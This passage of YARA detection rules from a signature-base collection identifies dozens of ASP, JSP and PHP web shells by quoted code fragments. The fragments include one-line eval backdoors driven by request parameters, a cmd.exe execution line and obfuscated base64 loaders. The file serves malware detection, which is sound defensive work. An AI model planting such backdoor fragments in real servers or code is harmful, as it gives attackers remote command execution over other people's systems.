		date = "2014/01/28"
		score = 70
		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<% execute request(\"ice\")%>a " fullword
	condition:
		all of them
}
rule webshell_jsp_guige {
	meta:
		description = "Web Shell - file guige.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "2c9f2dafa06332957127e2c713aacdd2"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
	condition:
		all of them
}
rule webshell_phpspy2010 {
	meta:
		description = "Web Shell - file phpspy2010.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "14ae0e4f5349924a5047fed9f3b105c5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "eval(gzinflate(base64_decode("
		$s5 = "//angel" fullword
		$s8 = "$admin['cookiedomain'] = '';" fullword
	condition:
		all of them
}
rule webshell_asp_ice {
	meta:
		description = "Web Shell - file ice.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d141e011a92f48da72728c35f1934a2b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
	condition:
		all of them
}
rule webshell_drag_system {
	meta:
		description = "Web Shell - file system.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "15ae237cf395fb24cf12bff141fb3f7c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
	condition:
		all of them
}
rule webshell_DarkBlade1_3_asp_indexx {
	meta:
		description = "Web Shell - file indexx.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b7f46693648f534c2ca78e3f21685707"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
	condition:
		all of them
}
rule webshell_phpshell3 {
	meta:
		description = "Web Shell - file phpshell3.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "76117b2ee4a7ac06832d50b2d04070b8"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
	condition:
		2 of them
}
rule webshell_jsp_hsxa {
	meta:
		description = "Web Shell - file hsxa.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
	condition:
		all of them
}
rule webshell_jsp_utils {
	meta:
		description = "Web Shell - file utils.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "9827ba2e8329075358b8e8a53e20d545"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_asp_01 {
	meta:
		description = "Web Shell - file 01.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 50
		hash = "61a687b0bea0ef97224c7bd2df118b87"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
rule webshell_asp_404 {
	meta:
		description = "Web Shell - file 404.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
	condition:
		all of them
}
rule webshell_webshell_cnseay02_1 {
	meta:
		description = "Web Shell - file webshell-cnseay02-1.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "95fc76081a42c4f26912826cb1bd24b1"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
	condition:
		all of them
}
rule webshell_php_fbi {
	meta:
		description = "Web Shell - file fbi.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1fb32f8e58c8deb168c06297a04a21f1"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
	condition:
		all of them
}
rule webshell_B374kPHP_B374k {
	meta:
		description = "Web Shell - file B374k.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "bed7388976f8f1d90422e8795dff1ea6"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Http://code.google.com/p/b374k-shell" fullword
		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
		$s4 = "B374k Vip In Beautify Just For Self" fullword
	condition:
		1 of them
}
rule webshell_cmd_asp_5_1 {
	meta:
		description = "Web Shell - file cmd-asp-5.1.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
	condition:
		all of them
}
rule webshell_php_dodo_zip {
	meta:
		description = "Web Shell - file zip.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b7800364374077ce8864796240162ad5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
	condition:
		all of them
}
rule webshell_aZRaiLPhp_v1_0 {
	meta:
		description = "Web Shell - file aZRaiLPhp v1.0.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "26b2d3943395682e36da06ed493a3715"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
	condition:
		all of them
}
rule webshell_php_list {
	meta:
		description = "Web Shell - file list.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "922b128ddd90e1dc2f73088956c548ed"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "// list.php = Directory & File Listing" fullword
		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
		$s9 = "// by: The Dark Raver" fullword
	condition:
		1 of them
}
rule webshell_ironshell {
	meta:
		description = "Web Shell - file ironshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
	condition:
		all of them
}
rule webshell_caidao_shell_404 {
	meta:
		description = "Web Shell - file 404.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
	condition:
		all of them
}
rule webshell_ASP_aspydrv {
	meta:
		description = "Web Shell - file aspydrv.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "de0a58f7d1e200d0b2c801a94ebce330"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
	condition:
		all of them
}
rule webshell_jsp_web {
	meta:
		description = "Web Shell - file web.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
	condition:
		all of them
}
rule webshell_mysqlwebsh {
	meta:
		description = "Web Shell - file mysqlwebsh.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "babfa76d11943a22484b3837f105fada"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
	condition:
		all of them
}
rule webshell_jspShell {
	meta:
		description = "Web Shell - file jspShell.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
	condition:
		all of them
}
rule webshell_Dx_Dx {
	meta:
		description = "Web Shell - file Dx.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s9 = "class=linelisting><nobr>POST (php eval)</td><"
	condition:
		1 of them
}
rule webshell_asp_ntdaddy {
	meta:
		description = "Web Shell - file ntdaddy.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 =  "if  FP  =  \"RefreshFolder\"  or  "
		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
	condition:
		1 of them
}
rule webshell_MySQL_Web_Interface_Version_0_8 {
	meta:
		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
	condition:
		all of them
}
rule webshell_elmaliseker_2 {
	meta:
		description = "Web Shell - file elmaliseker.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
	condition:
		all of them
}
rule webshell_ASP_RemExp {
	meta:
		description = "Web Shell - file RemExp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
	condition:
		all of them
}
rule webshell_jsp_list1 {
	meta:
		description = "Web Shell - file list1.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
	condition:
		all of them
}
rule webshell_phpkit_1_0_odd {
	meta:
		description = "Web Shell - file odd.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "include('php://input');" fullword
		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
	condition:
		all of them
}
rule webshell_jsp_123 {
	meta:
		description = "Web Shell - file 123.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "c691f53e849676cac68a38d692467641"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
	condition:
		all of them
}
rule webshell_asp_1 {
	meta:
		description = "Web Shell - file 1.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "8991148adf5de3b8322ec5d78cb01bdb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
		$s8 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
rule webshell_ASP_tool {
	meta:
		description = "Web Shell - file tool.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "4ab68d38527d5834e9c1ff64407b34fb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
	condition:
		2 of them
}
rule webshell_cmd_win32 {
	meta:
		description = "Web Shell - file cmd_win32.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
	condition:
		2 of them
}
rule webshell_jsp_jshell {
	meta:
		description = "Web Shell - file jshell.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "124b22f38aaaf064cef14711b2602c06"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "kXpeW[\"" fullword
		$s4 = "[7b:g0W@W<" fullword
		$s5 = "b:gHr,g<" fullword
		$s8 = "RhV0W@W<" fullword
		$s9 = "S_MR(u7b" fullword
	condition:
		all of them
}
rule webshell_ASP_zehir4 {
	meta:
		description = "Web Shell - file zehir4.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "7f4e12e159360743ec016273c3b9108c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
	condition:
		all of them
}
rule webshell_wsb_idc {
	meta:
		description = "Web Shell - file idc.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "7c5b1b30196c51f1accbffb80296395f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
		$s3 = "{eval($_GET['idc']);}" fullword
	condition:
		1 of them
}
rule webshell_cpg_143_incl_xpl {
	meta:
		description = "Web Shell - file cpg_143_incl_xpl.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5937b131b67d8e0afdbd589251a5e176"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
	condition:
		1 of them
}
rule webshell_mumaasp_com {
	meta:
		description = "Web Shell - file mumaasp.com.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "cce32b2e18f5357c85b6d20f564ebd5d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
	condition:
		all of them
}
rule webshell_php_404 {
	meta:
		description = "Web Shell - file 404.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "ced050df5ca42064056a7ad610a191b3"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$pass = md5(md5(md5($pass)));" fullword
	condition:
		all of them
}
rule webshell_webshell_cnseay_x {
	meta:
		description = "Web Shell - file webshell-cnseay-x.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
	condition:
		all of them
}
rule webshell_asp_up {
	meta:
		description = "Web Shell - file up.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "f775e721cfe85019fe41c34f47c0d67c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
	condition:
		1 of them
}
rule webshell_phpkit_0_1a_odd {
	meta:
		description = "Web Shell - file odd.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "3c30399e7480c09276f412271f60ed01"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "include('php://input');" fullword
		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
		$s4 = "// uses include('php://input') to execute arbritary code" fullword
		$s5 = "// php://input based backdoor" fullword
	condition:
		2 of them
}
rule webshell_ASP_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "97af88b478422067f23b001dd06d56a9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	condition:
		all of them
}
rule webshell_PHP_Shell_x3 {
	meta:
		description = "Web Shell - file PHP Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
	condition:
		2 of them
}
rule webshell_PHP_g00nv13 {
	meta:
		description = "Web Shell - file g00nv13.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "35ad2533192fe8a1a76c3276140db820"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
	condition:
		all of them
}
rule webshell_php_h6ss {
	meta:
		description = "Web Shell - file h6ss.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "272dde9a4a7265d6c139287560328cd5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php eval(gzuncompress(base64_decode(\""
	condition:
		all of them
}
rule webshell_jsp_zx {
	meta:
		description = "Web Shell - file zx.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "67627c264db1e54a4720bd6a64721674"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
	condition:
		all of them
}
rule webshell_Ani_Shell {
	meta:
		description = "Web Shell - file Ani-Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "889bfc9fbb8ee7832044fc575324d01a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$Python_CODE = \"I"
		$s6 = "$passwordPrompt = \"\\n================================================="
		$s7 = "fputs ($sockfd ,\"\\n==============================================="
	condition:
		1 of them
}
rule webshell_jsp_k8cmd {
	meta:
		description = "Web Shell - file k8cmd.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b39544415e692a567455ff033a97a682"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
	condition:
		all of them
}

rule webshell_jsp_cmd {
	meta:
		description = "Web Shell - file cmd.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5391c4a8af1ede757ba9d28865e75853"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
	condition:
		all of them
}

rule webshell_jsp_k81 {
	meta:
		description = "Web Shell - file k81.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "41efc5c71b6885add9c1d516371bd6af"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
	condition:
		1 of them
}
rule webshell_ASP_zehir {
	meta:
		description = "Web Shell - file zehir.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "0061d800aee63ccaf41d2d62ec15985d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
	condition:
		all of them
}
rule webshell_Worse_Linux_Shell_1 {
	meta:
